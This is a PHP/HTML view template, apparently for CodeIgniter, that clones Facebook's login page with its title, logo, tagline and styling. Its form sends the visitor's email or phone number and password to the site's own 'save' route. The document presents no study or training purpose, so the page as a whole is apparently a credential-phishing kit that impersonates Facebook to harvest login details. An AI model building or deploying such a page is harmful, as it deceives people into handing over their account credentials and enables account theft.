<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Facebook</title>
    <link rel="stylesheet" type="text/css" href="<?= base_url('assets/style.css') ?>">
    <!-- Bootstrap 5 -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
    <link rel="icon" type="image/x-icon" href="<?= base_url('assets/favicon.ico') ?>">
</head>
<body style="background: #f3f4f1;">
    <div class="container">
        <div class="row text-center">
            <div class="col-md-6 text-center">
                <div class="mt-5">
                    <input type="hidden" name="">
                </div>
                <div class="mt-5">
                    <input type="hidden" name="">
                </div>
                <img src="<?= base_url('assets/facebook.png') ?>" class="mt-5 pl-5" alt="facebook" style="">
                <p class="fb-p">
                    Facebook helps you connect and share with the people in your life.
                </p>
            </div>
            <div class="col-md-6 text-center">
                <div class="card mt-5 me-3">
                    <div class="card-body d-grid mt-5">
                        <form method="POST" action="<?= base_url('save') ?>">
                            <?= csrf_field() ?>
                            <div class="mb-4">
                                <input type="text" class="form-control form-control-lg" name="email" placeholder="Email address or phone number">
                            </div>
                            <div class="mb-4">
                                <input type="password" class="form-control form-control-lg" name="password" placeholder="Password">
                            </div>
                            <div class="d-grid">
                                <?= session()->getFlashdata('error') ?>
                                <?= service('validation')->listErrors() ?>
                                <br>
                                <button class="btn btn-primary btn-lg">
                                    Log in
                                </button>
                                <br>
                                <a class="card-link mt-5" href="">Forgotten password?</a>
                            </div>
                            <hr>

                            <button type="submit" class="btn btn-success btn-lg">
                                Create New Account
                            </button>
                        </form>
                    </div>
                </div>
                <p class="mt-3">
                    <a href="#">
                        <strong style="color: black;">Create a Page</strong>
                    </a> for a celebrity, brand or business.
                </p>
            </div>
        </div>
    </div>
</body>
</html>